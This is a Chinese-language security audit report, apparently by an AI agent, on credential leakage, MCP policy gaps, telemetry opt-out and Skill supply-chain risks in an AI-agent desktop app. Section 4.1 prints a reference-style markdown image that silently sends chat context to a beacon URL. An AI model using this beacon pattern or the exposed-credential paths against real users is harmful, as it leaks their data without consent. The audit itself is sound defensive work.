# 安全真实情况审计与 Issue 登记（2026-10-09）

- driven_by: agent
- actor: codex-security-auditor
- status: audit-complete / fixes-not-applied
- 时间口径：Asia/Shanghai。

## 1. 范围与基线

本轮对用户粘贴的安全评估摘要做**定向真实性审计**，重点是提示词/第三方内容、执行凭据、聊天资源加载、MCP 策略、Skill 安装、遥测和安全文档。不是全仓所有 bug 的穷尽扫描，也不把外部产品事故类比当作本项目证据。

- 工作区：本轮使用的本地检出（Windows 上是一个目录联接，不是仓库内相对路径；因此本记录只引用仓库相对产物路径）。
- 本地分支：`codex/stepfun-basic-evidence-20261008`；HEAD：`9a48096f94a5df7cd0c9b127c929e57f597d6c50`。
- 审计时远端 main：`7573115a797e4992ae77cf5425fa62763d9a4691`，领先本地 19 个提交。独立旁路核验 29 个文件，主审补查 17 个关键文件，合计 **46 个源文件的 HEAD blob 与该 main 一致**。不是在最新 main 安装包上执行全套验收。
- 工作树有既存未提交变更。所核验源文件中只有 `electron/main/index.ts` 存在实质工作树差异；已阅读 diff，改动为效率采样导入/启动/停止，不改变本轮涉及的遥测初始化或 CSP/资源边界。引用 main 行号时使用 HEAD 版本。
- 输入提到的 `docs/dev/security-posture-assessment-20261009.md` **在本检出中不存在**；本轮读取的是用户粘贴摘要，并重新查证源码。未声称读过那份 451 行完整报告。
- 环境：Windows、Node v24.15.0、pnpm 11.2.2、验证浏览器 Chrome 155.0.8059.39。

## 2. 结论：问题集中在最终执行和资源加载边界

项目不是没有安全措施。缺省 exec allowlist/on-miss、显式来源约束、Main/Renderer 隔离、密钥存储和路径代理都已有实现及相关测试；本轮选定的 9 个既有测试文件也全部通过。

但**配置/提示词/纯函数验证不等于最终执行受约束**：Provider 凭据净化、MCP per-server 禁网和聊天图片加载均存在可复现缺口；遥测关闭缺少运行时生命周期处理；Skill 版本元数据不反映实际下载字节。

本轮不采用原摘要的“全部 P0”口径。没有证明无前置的远程接管、真实数据外泄或管理员权限获取。宿主进程继承的是运行账户权限，不等同于无条件拥有 OS 管理员权限。

## 3. 已提交的 Issue

已在**既有私有仓库** `Baixu22/VerseClaw` 新建 8 条，并逐条回读确认 OPEN、标题和正文匹配；未改变仓库可见性。

| 优先级 | Issue / 问题 | 实证层级 |
|---|---|---|
| P1 | [#126](https://github.com/Baixu22/VerseClaw/issues/126) 执行环境凭据暴露 | 真实净化函数 + 合成 Node child；5 类凭据仍可见 |
| P1 | [#127](https://github.com/Baixu22/VerseClaw/issues/127) 零点击图片出站 | 真实组件 DOM + Chrome；引用式图片产生 1 次 GET |
| P1 | [#128](https://github.com/Baixu22/VerseClaw/issues/128) 配置与执行脱节 | Main 拒绝，但生产 transport 完成 3 次 MCP POST |
| P1 | [#129](https://github.com/Baixu22/VerseClaw/issues/129) 关闭开关不生效 | 真实设置/遥测模块；false 后仍调用 capture |
| P2 | [#130](https://github.com/Baixu22/VerseClaw/issues/130) 同机凭据暴露面 | 源码 argv + 自建进程 Win32 CommandLine 可见 |
| P2 | [#131](https://github.com/Baixu22/VerseClaw/issues/131) 版本契约/供应链风险 | 两种请求版本均拉 main、记录同一目录版本；自动启用 |
| P2 | [#132](https://github.com/Baixu22/VerseClaw/issues/132) 防御纵深风险 | 静态策略审计；未证明任意脚本注入 |
| P3 | [#133](https://github.com/Baixu22/VerseClaw/issues/133) 文档缺口 | 模板版本表/占位文字仍在当前文件 |

现有 [#86 遥测归属/默认值/隐私流](https://github.com/Baixu22/VerseClaw/issues/86) 没有重复开单，已添加[实证与口径纠正](https://github.com/Baixu22/VerseClaw/issues/86#issuecomment-6079624222)。运行时 opt-out 的确定缺陷单独登记为 #129。

去重还区分了 #9（历史 Provider 认证未注入）、#73（孤立 skills-lock 文件）、#78（测试盲区）、#107（角色对动态 MCP 工具权限）、#108（Role Memory 敏感内容）。本轮没有重开这些既有问题，也没有关闭任何旧 issue。

## 4. 对输入摘要的关键修正

### 4.1 普通 inline 图片反例不成立，但引用式图片有真实请求

[src/pages/Chat/message-utils.ts:72-91](https://github.com/Baixu22/VerseClaw/blob/7573115a797e4992ae77cf5425fa62763d9a4691/src/pages/Chat/message-utils.ts#L72-L91) 会剥离普通 `![alt](url)`；本轮最初按该输入测试，真实 ChatMessage 没有图片，失败证据保留。

但引用式语法未被该正则覆盖：

```markdown
![audit-beacon][audit]

[audit]: http://127.0.0.1:<fixture-port>/beacon?d=AUDIT_SYNTHETIC_CONTEXT
```

真实组件生成了 img，真实 Chrome 在 Renderer CSP 下、**0 点击**发出 **1 次携带合成标记的 GET**。因此 #127 记录准确路径，不照抄原来的单行 PoC。该验证是组件 DOM + 浏览器请求，不冒充完整 Electron/readOnly E2E。

### 4.2 凭据继承是真问题，但不是审批绕过

真实 host sanitizer 和真实子进程保留 OPENAI/ANTHROPIC/DEEPSEEK/custom Provider API key 及 Gateway token，过滤了 GITHUB_TOKEN；同一组合传给 sandbox sanitizer，6 个键均被过滤。只有合成值。

代码链从 [electron/gateway/config-sync.ts:1150-1157](https://github.com/Baixu22/VerseClaw/blob/7573115a797e4992ae77cf5425fa62763d9a4691/electron/gateway/config-sync.ts#L1150-L1157) 到 [openclaw_runtime/src/agents/bash-tools.exec.ts:1753-1765](https://github.com/Baixu22/VerseClaw/blob/7573115a797e4992ae77cf5425fa62763d9a4691/openclaw_runtime/src/agents/bash-tools.exec.ts#L1753-L1765)，再到最终 spawn。**必须先有被允许/批准的宿主命令**。本轮没有测取真实密钥、没有实际外发，也没有验证所有执行后端。

Gateway argv 风险 #130 同样收窄到 Windows 同账户读取自建合成进程；生产日志的参数副本确有脱敏，不应误报为日志直接泄密。

### 4.3 MCP 不能只看 grep 或投影字段

本轮进一步让实际 [openclaw_runtime/src/agents/mcp-transport.ts:88-145](https://github.com/Baixu22/VerseClaw/blob/7573115a797e4992ae77cf5425fa62763d9a4691/openclaw_runtime/src/agents/mcp-transport.ts#L88-L145) 消费 Main 投影的 disabled 配置：Main 决策拒绝，runtime 仍完成 initialize、notifications/initialized、tools/list 三个 POST。

当前 F-AUTH-009 在 [plans/system-maturity/findings-registry.json:746-760](https://github.com/Baixu22/VerseClaw/blob/7573115a797e4992ae77cf5425fa62763d9a4691/plans/system-maturity/findings-registry.json#L746-L760) 仍为 Fixed/L4；旧测试只验证投影和纯策略函数。本轮保留该登记不擅改，但 #128 提供了与其“runtime enforced”口径相矛盾的新反证。运行时已有 SSRF/TLS 防护，不应概括成“完全没有网络防护”。

### 4.4 Skill 入口有限制，风险在版本/字节身份与自动启用

入口限制为 6 个内置目录 slug，不是随意安装任意仓库。调用两个不同合成 version，实际 clone 参数均为 main，installedVersion 均来自目录声明。Main 和 Renderer store 两边都有自动启用，不能只删一处。

本轮使用 mock clone/文件系统确认调用契约，**0 真实下载、0 实际技能安装**。未声称某个上游已遭攻击，也没有把自动启用直接说成任意代码立即执行。

### 4.5 遥测有两条流，冷启动关闭与运行时关闭不同

- `src/lib/telemetry.ts` 的 500 条 UI ring 是本地记录。
- Main PostHog 为另一条流，真实新设置默认 true，并产生安装/打开事件。隐私清单没有完整单列它，不能仅用“Local-only by default”概括全部遥测。
- 新 module 在初始化前设 false，capture 被阻断；启动后改 false，已存在的 client 仍接收事件。#129 只针对后一条。
- 测试使用内存 store、合成 machine ID 和无网络 capture sink；不声称向真实 PostHog 发送过流量。
- 源码不能证明远端分析账户的实际所有权/读取者，public ingest 标识也不等同于读权限 API key。

### 4.6 未将架构取舍或外部类比包装成 bug

未新增“必须建立完整内核沙箱”“按 Codex/Manus 类比就断言可接管”等 issue。CSP 过宽作为 #132 加固风险，明确没有实测 XSS 入口；SECURITY.md 模板作为 #133 文档缺口。也没有继续沿用“仓库无后门、仅三个出站入口”这种缺少穷尽证据的结论。

## 5. 执行与验证结果

| 项目 | 磁盘结果 | 边界 |
|---|---|---|
| 既有定向安全测试 | **9 文件 / 34 passed / 0 failed / 0 skipped，exit 0** | 覆盖 host invoke、密钥存储、path/permissions、MCP 旧安全面、敏感内容矩阵、suite runner、遥测；不是完整 P7 release gate |
| 新增审计测试 | **4 文件 / 7 passed / 0 failed / 0 skipped，exit 0** | 正向断言当前问题仍存在，并有 inline 图片/本地路径/冷启动关闭等负向对照；不是修复后验收 |
| runtime-boundaries.mjs | **3 个反例完成，exit 0** | host env、合成 argv 进程可见性、真实 MCP transport + loopback SDK 握手 |
| chat-beacon-browser.mjs | **1 GET / 0 点击，exit 0** | 真实组件 DOM + Chrome；只允许 loopback 请求 |
| Harness context | **exit 0** | 读取既有 security-regression task 的上下文；不冒充完整 harness run |
| 原始 git diff --check | **exit 2：5 处既存 CRLF 空白告警** | 均在未修改的效率采样变更；逐字节保全。仅本条检查不通过，不掩盖为绿色 |
| GitHub 提交/回读 | **8/8 正文匹配，均 OPEN；#86 评论匹配** | 私有仓库；没有发布/部署/改可见性 |

原始 diff 检查对既有 `electron/main/index.ts` 的 43、1380、1381、1418、1419 行报告 trailing whitespace；这些改动 SHA-256 与审计前完全一致。以只读命令选项 `git -c core.whitespace=cr-at-eol diff --check` 复查退出 0，说明这五条是 CRLF 口径；未修改 Git 配置或他人文件。本报告自身没有行尾空白。

历史失败没有删除：原 inline 图片反例未出现图片；一轮 mock 缺 default export；浏览器首次使用错误的 Chrome 查找路径；GitHub CLI 的 Node 工具环境缺 APPDATA。分别保留原始报告，修正测试/环境后再跑。最后一项只是工具环境问题，恢复标准 Windows 环境后复用现有登录，未索取/读取/轮换凭据。

未运行：全项目测试、完整 Electron E2E、跨 OS 测试、release gate、外部真人/模型测试、真实凭据泄露演示。没有修改运行时产品代码，因此没有为本轮报告泛跑构建/通信回放。

## 6. 建议处理顺序

1. **#126 + #127**：先缩小应用凭据进入任意 child 的范围，并给自动资源请求加最终边界。
2. **#128**：让 per-server MCP 策略在真实连接处生效，随后修正/刷新 F-AUTH-009 证据。
3. **#129**：让关闭遥测立即停止后续发送，和 #86 的默认值/隐私流分工。
4. **#130 / #131**：移除不必要 argv 秘密暴露，校正 Skill 版本与字节信任。
5. **#132 / #133**：收紧 CSP 防御纵深并补真实安全政策。

每条 issue 已给出 agent 可执行的合成验收标准，无“等真人 verdict/真人数据”前置。此排序不自动授权改变冻结默认值、架构范围或发布策略。

## 7. 主要产物与可复跑入口

- [Issue 创建与逐条回读记录](artifacts/security-reality-audit-20261009/created-issues.json)
- [已有遥测 Issue 的补充评论记录](artifacts/security-reality-audit-20261009/issue-86-comment.json)
- [运行时三条反例结果](artifacts/security-reality-audit-20261009/runtime-boundaries.json)
- [图片实际请求记录](artifacts/security-reality-audit-20261009/chat-beacon-browser.json)
- [最终 7 项审计测试结果](artifacts/security-reality-audit-20261009/probe-tests-final.json)
- [既有 34 项安全测试结果](artifacts/security-reality-audit-20261009/existing-focused-tests.json)
- [独立远端/去重核验](artifacts/security-reality-audit-20261009/remote-baseline.json)
- [关键 17 文件补充核验](artifacts/security-reality-audit-20261009/extra-main-source-checks-verified.json)
- [46 个源码指纹](artifacts/security-reality-audit-20261009/source-fingerprints.json)
- [原有工作区改动保全证据](artifacts/security-reality-audit-20261009/workspace-preservation.json)
- [完整证据哈希索引](artifacts/security-reality-audit-20261009/evidence-manifest.json)

在该工作区可重跑（使用已安装依赖；不是 fresh install）：

```powershell
pnpm exec vitest run --config artifacts/security-reality-audit-20261009/probes/vitest.config.ts --maxWorkers=1
node artifacts/security-reality-audit-20261009/probes/runtime-boundaries.mjs
node artifacts/security-reality-audit-20261009/probes/chat-beacon-browser.mjs
```

实际执行时为避免 shell/依赖重整，Vitest 使用已安装 CLI 的绝对路径由 Node 启动；原始 argv、exit code 和时间均在对应 *-run.json。Browser 使用全新临时 context，不读用户浏览器数据。探针是本地一次性审计产物，不是已提交到 main 的产品回归。

## 8. 改动边界

新增仅为本报告及 `artifacts/security-reality-audit-20261009/` 中的审计/探针/Issue 正文。原有 `.gitignore` 与 `electron/main/index.ts` SHA-256 前后相同；既有未跟踪效率工作和并行新增的错误治理报告未改动。HEAD 未改变，未切换分支、commit、push、清理工作树或更改 Task Forest/产品锁。**Issue 已提交不等于 bug 已修复。**
